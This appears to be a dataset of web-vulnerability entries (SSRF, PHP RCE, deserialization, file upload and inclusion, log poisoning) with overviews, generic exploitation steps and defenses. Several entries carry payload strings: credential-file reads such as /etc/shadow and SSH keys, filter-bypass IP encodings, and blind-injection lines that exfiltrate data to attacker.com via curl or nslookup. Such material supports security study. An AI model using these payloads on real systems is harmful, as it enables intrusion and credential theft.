ov_en: SSRF in Azure cloud environments can access the IMDS (Instance Metadata Service, 169.254.169.254) to obtain Managed Identity OAuth tokens, then access Azure Key Vault secrets, storage accounts, SQL databases, and other cloud resources.
vu_en: Azure IMDS endpoints require a Metadata: true header. Key paths: /metadata/instance retrieves VM configuration, and /metadata/identity/oauth2/token obtains a Managed Identity Access Token usable with the Azure Resource Manager API to manage all authorized resources.
ex_en:
Full exploitation workflow:
1. Discover SSRF vulnerability
2. Add Metadata header to access metadata service
3. Obtain Managed Identity token
4. Use token to access Azure resources
mi_en:
Defenses:
1. Disable Managed Identity if not needed
2. Implement network isolation
3. Monitor for anomalous metadata access
4. Apply Azure Firewall rules

ov_en: SSRF protocol exploitation extends the attack surface beyond http/https. file:// reads local files, gopher:// constructs arbitrary TCP packets, dict:// probes services, and ftp:// accesses FTP—greatly enhancing SSRF capabilities.
vu_en: Dangerous protocols supported by SSRF: file:// reads local files (file:///etc/passwd), gopher:// constructs arbitrary TCP packets (attacking Redis/MySQL/SMTP and other internal services), dict:// probes port status and service fingerprints, ftp:// accesses internal FTP, and ldap:// queries directory services.
ex_en:
Full exploitation workflow:
1. Test supported protocols
2. Select the appropriate protocol
3. Craft attack payload
4. Retrieve data or execute commands
mi_en:
Defenses:
1. Restrict protocols via allowlist (HTTP/HTTPS only)
2. Disable dangerous protocol handlers
3. URL normalization and validation
4. Network isolation

ov_en: The gopher:// protocol is the most powerful protocol in SSRF exploitation. It can construct arbitrary TCP payloads and simulate communication protocols for Redis, MySQL, SMTP, HTTP, and more—the key technique for escalating SSRF to internal service RCE.
vu_en: gopher:// passes raw TCP data via URL encoding: gopher://ip:port/_[url-encoded-data]. It enables crafting Redis SLAVEOF/CONFIG SET commands to write WebShells, MySQL authentication packets to execute SQL, SMTP emails, and HTTP POST requests—turning SSRF into arbitrary operations against internal services.
ex_en:
Full exploitation workflow:
1. Confirm gopher:// protocol support
2. Craft target service protocol data
3. URL-encode the payload
4. Send the attack request
mi_en:
Defenses:
1. Disable gopher:// protocol
2. Restrict protocols via allowlist
3. Network isolation
4. Monitor for anomalous requests

ov_en: The dict:// protocol sends a single line of text to a specified IP:port, commonly used for port scanning and service fingerprinting in SSRF. When gopher:// is unavailable, it is an effective alternative for internal network reconnaissance.
vu_en: dict:// sends DICT protocol commands (single line + CRLF) to the target. Uses: 1) Port scanning (dict://ip:port/info detects open ports) 2) Redis command execution (dict://ip:6379/SET key value) 3) Service fingerprinting via response analysis.
ex_en:
Full exploitation workflow:
1. Confirm dict:// protocol support
2. Probe internal services
3. Send malicious commands
4. Retrieve data or write files
mi_en:
Defenses:
1. Disable dict:// protocol
2. Restrict protocols via allowlist
3. Require authentication on internal services
4. Network isolation

ov_en: The file:// protocol is the most basic SSRF exploitation method, directly reading arbitrary files from the server's local filesystem. Simple but highly effective for obtaining configuration files, source code, and key material.
vu_en: file:// reads local files: file:///etc/passwd (user list), file:///etc/shadow (password hashes, requires root), file:///proc/self/environ (environment variables, may contain secrets), file:///root/.ssh/id_rsa (SSH private key). On Windows, reads C:\Windows\win.ini and similar files.
ex_en:
Full exploitation workflow:
1. Confirm file:// protocol support
2. Probe sensitive file paths
3. Read configuration files to obtain credentials
4. Use credentials for further penetration
mi_en:
Defenses:
1. Disable file:// protocol
2. Restrict protocols via allowlist
3. File permission controls
4. Encrypt sensitive files at rest

ov_en: SSRF bypass techniques circumvent application-layer URL filtering (IP blacklists/whitelists/domain restrictions) via IP encoding transforms, DNS rebinding, URL parsing differences, and redirect chaining.
vu_en: SSRF filter bypass methods: 1) IP obfuscation (0177.0.0.1/2130706433/0x7f000001) 2) IPv6 (::1/::ffff:127.0.0.1) 3) DNS rebinding (switching resolution between requests) 4) URL parsing differences (@ symbol/URL encoding) 5) 302 redirect chaining 6) URL shorteners 7) Radix conversion 8) CNAME to internal IP.
ex_en:
Full exploitation workflow:
1. Analyze filter rules
2. Test various bypass techniques
3. Find an effective bypass
4. Access internal resources
mi_en:
Defenses:
1. Validate IP address after DNS resolution
2. Block access to internal IP ranges
3. Disable redirect following
4. Validate after DNS resolution

ov_en: DNS rebinding attacks bypass SSRF hostname/IP validation by changing DNS resolution between two lookups: the first resolves to a legitimate public IP to pass validation, then resolves to an internal IP on the actual request.
vu_en: DNS rebinding exploits domains with extremely low TTL (0-1 second): the first resolution returns a public IP to pass server-side URL validation; the second (on actual request) returns 127.0.0.1 or an internal IP. Online rebinding services (e.g., rbndr.us) or self-hosted DNS servers can be used.
ex_en:
Full exploitation workflow:
1. Set up or use a DNS rebinding service
2. Configure domain resolution strategy
3. Issue request using the rebinding domain
4. Bypass validation and access internal resources
mi_en:
Defenses:
1. Cache DNS resolution results server-side
2. Re-validate resolved IP rather than trusting cached hostname
3. Disable DNS-based resolution where possible
4. Network-layer isolation

ov_en: Using SSRF to attack Redis is the most classic internal service exploitation scenario. Sending Redis commands via gopher:// enables writing WebShells, SSH public keys, and crontab jobs, directly escalating SSRF to server RCE.
vu_en: Redis defaults to no authentication and listens on 0.0.0.0:6379. SSRF via gopher:// sends Redis commands: 1) SET/CONFIG SET dir+dbfilename writes WebShell to web directory 2) Write SSH public key to /root/.ssh/authorized_keys 3) Write crontab for reverse shell 4) Master-slave replication to load malicious module (RCE).
ex_en:
Full exploitation workflow:
1. Probe Redis via SSRF
2. Write WebShell, or
3. Write SSH public key, or
4. Write crontab reverse shell
5. Obtain server access
mi_en:
Defenses:
1. Require Redis password authentication
2. Bind Redis to internal IP only
3. Disable dangerous commands (RENAME)
4. Network isolation

ov_en: SSRF targeting MySQL uses gopher:// to craft MySQL protocol packets. When the target MySQL allows unauthenticated local connections, arbitrary SQL can be executed to read sensitive data or write WebShells via INTO OUTFILE.
vu_en: When MySQL allows empty-password local connections (common in development), SSRF via gopher:// sends MySQL protocol packets: 1) Authentication handshake 2) Query packets (SELECT/INSERT/INTO OUTFILE). Tools like Gopherus auto-generate URL-encoded MySQL protocol payloads.
ex_en:
Full exploitation workflow:
1. Confirm MySQL service is accessible
2. Obtain username
3. Craft MySQL protocol packets
4. Execute SQL commands
5. Write WebShell
mi_en:
Defenses:
1. Set a strong MySQL password
2. Disallow empty-password logins
3. Restrict network access to MySQL
4. Disable file write capabilities

ov_en: PHP code execution vulnerabilities use functions like eval()/assert()/preg_replace(e modifier)/array_map() to execute user input as PHP code, enabling file read, database operations, and OS command execution.
vu_en: Dangerous PHP functions include: eval()/assert() directly execute code strings, preg_replace() with e modifier (PHP<7) executes replacement results as code, create_function()/call_user_func() enable dynamic function calls, and array_map()/usort() allow callback injection.
ex_en:
Full exploitation workflow:
1. Discover code execution point
2. Craft malicious code
3. Execute OS commands
4. Write WebShell
5. Obtain server access
mi_en:
Defenses:
1. Disable dangerous functions
2. Whitelist input validation
3. Use parameterized calls
4. Principle of least privilege

ov_en: PHP filter chain RCE (discovered in 2022) generates arbitrary content from scratch by combining multiple php://filter iconv character-set conversion filters, then achieves RCE via include—no file upload required.
vu_en: PHP filter chains exploit the combined effect of iconv charset conversion filters: specific conversion sequences (e.g., UTF-7→UTF-8) construct arbitrary PHP code byte by byte. An LFI vulnerability (include($_GET["file"])) combined with a filter chain directly achieves RCE without file upload or log poisoning.
ex_en:
Full exploitation workflow:
1. Discover file inclusion vulnerability
2. Use a tool to generate the filter chain
3. Craft malicious request
4. Execute arbitrary code
mi_en:
Defenses:
1. Disable php://filter
2. Whitelist-restrict file paths
3. Disable dangerous filters
4. Upgrade PHP version

ov_en: Blind command injection occurs when command execution succeeds but output is not reflected in the response. Exploitation requires indirect confirmation via DNS out-of-band (nslookup), HTTP out-of-band (curl), time delays (sleep), or file writes.
vu_en: Blind command injection confirmation and exploitation methods: 1) Time delay (;sleep 5) 2) DNS out-of-band (;nslookup $(whoami).attacker.com) 3) HTTP out-of-band (curl http://attacker.com/$(cat /etc/hostname)) 4) Write to web directory then retrieve via HTTP.
ex_en:
Full exploitation workflow:
1. Confirm blind command injection via time delay
2. Use out-of-band channel to retrieve data
3. Craft reverse shell payload
4. Obtain server access
mi_en:
Defenses:
1. Avoid OS command calls
2. Use parameterized APIs
3. Whitelist input validation
4. Disable dangerous functions

ov_en: Deserialization vulnerabilities trigger malicious operations when restoring untrusted data to objects. Present in Java, PHP, Python, .NET, and more. Attackers craft special serialized data that automatically invokes dangerous methods during deserialization, achieving RCE.
vu_en: Deserialization attacks exploit magic methods automatically called during object restoration (e.g., Java readObject, PHP __wakeup/__destruct). POP (Property Oriented Programming) chains link method calls across multiple classes to ultimately trigger command execution.
ex_en:
Full exploitation workflow:
1. Identify deserialization entry points
2. Analyze available gadget chains
3. Generate malicious serialized data
4. Send payload to trigger RCE
mi_en:
Defenses:
1. Never deserialize untrusted data
2. Use class allowlists
3. Disable dangerous gadgets
4. Use safe serialization formats

ov_en: PHP deserialization exploits unserialize() processing user-controlled data to trigger magic methods (__destruct/__wakeup/__toString, etc.) and via POP chains calls dangerous functions like system()/exec() to achieve RCE.
vu_en: PHP deserialization exploit chain: unserialize() triggers __wakeup() or post-deserialization __destruct(); by modifying object properties to point to other class methods (POP chain), it ultimately calls command execution functions. Common exploitation frameworks include Laravel (PendingBroadcast chain) and Yii (BatchQueryResult chain).
ex_en:
Full exploitation workflow:
1. Find unserialize() call site
2. Analyze exploitable classes
3. Construct POP chain
4. Generate serialized payload
5. Send payload to trigger RCE
mi_en:
Defenses:
1. Never deserialize user input
2. Use json_encode/decode instead
3. Restrict deserializable classes via allowlist
4. Disable Phar deserialization

ov_en: Java deserialization is one of the most destructive vulnerability types. It exploits gadget chains in libraries like Apache Commons Collections/BeanUtils to execute arbitrary code when ObjectInputStream.readObject() is called.
vu_en: Java deserialization uses tools like ysoserial to generate gadget chains: CommonsCollections series (InvokerTransformer chain), CommonsBeanutils (BeanComparator chain), URLDNS (DNS probe), etc. Serialized data (magic bytes AC ED 00 05) appears in cookies, HTTP parameters, JMX, and RMI endpoints.
ex_en:
Full exploitation workflow:
1. Identify deserialization entry points
2. Detect available libraries
3. Select the appropriate gadget chain
4. Generate payload
5. Send payload to trigger RCE
mi_en:
Defenses:
1. Upgrade library versions
2. Use ObjectInputFilter to allowlist classes
3. Disable deserialization where not needed
4. Apply latest security patches

ov_en: File upload RCE uploads a file containing malicious code (WebShell) to a web-accessible server directory, then triggers execution by accessing it via HTTP. This is one of the most direct paths to server compromise.
vu_en: File upload RCE prerequisites: 1) Server allows uploading executable files (PHP/JSP/ASP) 2) Upload directory is under web root and URL-accessible 3) Server parses uploaded files as scripts. Bypass techniques include extension obfuscation, Content-Type manipulation, and path traversal.
ex_en:
Full exploitation workflow:
1. Analyze upload restrictions
2. Choose bypass method
3. Upload WebShell
4. Access and execute
5. Obtain server access
mi_en:
Defenses:
1. Whitelist extension validation
2. Inspect file content (magic bytes)
3. Rename uploaded files
4. Store uploads outside web root
5. Disable script execution in upload directories

ov_en: File inclusion RCE escalates LFI/RFI vulnerabilities to code execution by including log files, session files, /proc/self/environ, temporary upload files, and other sources containing injected PHP code.
vu_en: File inclusion RCE exploitation paths: 1) Log poisoning (inject PHP code in User-Agent → include access.log) 2) Session file inclusion (inject code into session → include /tmp/sess_xxx) 3) /proc/self/environ User-Agent injection 4) PHP temporary upload file race condition.
ex_en:
Full exploitation workflow:
1. Discover file inclusion point
2. Inject malicious code
3. Include the poisoned file
4. Execute OS commands
5. Obtain a shell
mi_en:
Defenses:
1. Whitelist-restrict file paths
2. Disable remote file inclusion
3. Disable PHP pseudo-protocols
4. Use open_basedir to restrict include paths

ov_en: Log poisoning RCE is one of the most reliable LFI-to-RCE escalation paths: inject PHP code into web server log files (via request headers), then load the log via a file inclusion vulnerability to trigger execution. Works with Apache, Nginx, and other mainstream web servers.
vu_en: Log poisoning injection points: 1) User-Agent/Referer in Apache access.log 2) Nginx access.log 3) error.log (trigger errors by requesting non-existent files) 4) FTP log (vsftpd) 5) Username field in SSH log (/var/log/auth.log).
ex_en:
Full exploitation workflow:
1. Discover file inclusion vulnerability
2. Locate log file path
3. Inject malicious code into a log entry
4. Include the log file
5. Execute commands to obtain a shell
mi_en:
Defenses:
1. Restrict access to log files via inclusion
2. Filter special characters in log entries
3. Disable file inclusion
4. Use open_basedir restrictions

ov_en: Image RCE exploits vulnerabilities or features in image processing libraries (ImageMagick/GD/Pillow) to execute code when the server processes uploaded images. ImageMagick's ImageTragick (CVE-2016-3714) is the most famous example.
vu_en: ImageMagick exploits its delegate (external command handler) mechanism: MVG format's push graphic-context directive, SVG xlink:href external references, ephemeral protocol file deletion, MSL format file writing, etc. Certain GD library versions also have heap overflow vulnerabilities.
ex_en:
Full exploitation workflow:
1. Craft image-embedded WebShell
2. Upload the image
3. Find a file inclusion point
4. Include the image to execute code
5. Obtain a shell
mi_en:
Defenses:
1. Inspect full file content
2. Re-render images to strip malicious code
3. Disable file inclusion
4. Store uploads outside web root

ov_en: .htaccess RCE uploads or modifies Apache .htaccess configuration files to change how the server handles specific file types (e.g., parse .jpg as PHP) or injects PHP code directly via php_value directives.
vu_en: .htaccess RCE methods: 1) AddType application/x-httpd-php .jpg to parse image files as PHP 2) php_value auto_prepend_file combined with php://input to inject code 3) SetHandler to process all files in a directory as PHP 4) php_flag engine combined with .user.ini.
ex_en:
Full exploitation workflow:
1. Upload malicious .htaccess
2. Configure file type parsing
3. Upload disguised WebShell
4. Access and execute
5. Obtain server access
mi_en:
Defenses:
1. Block .htaccess file uploads
2. Disable AllowOverride in Apache config
3. Whitelist filename validation
4. Rename uploaded files
